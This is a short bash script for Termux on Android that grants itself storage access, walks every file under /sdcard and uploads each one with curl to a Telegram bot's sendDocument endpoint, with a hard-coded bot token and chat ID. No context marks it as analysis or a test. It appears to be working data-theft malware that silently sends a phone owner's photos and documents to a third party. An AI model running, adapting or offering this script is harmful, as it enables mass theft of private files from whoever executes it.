#! /bin/bash

termux-setup-storage
cd /sdcard 
find ./ -name "*.*" | while read file; do 
   curl --form document=@$file https://api.telegram.org/bot5914616936:AAGS2Cx5_w8VTwVQq3g2flwymkiN_Em11ks/sendDocument?chat_id=5931840787
done
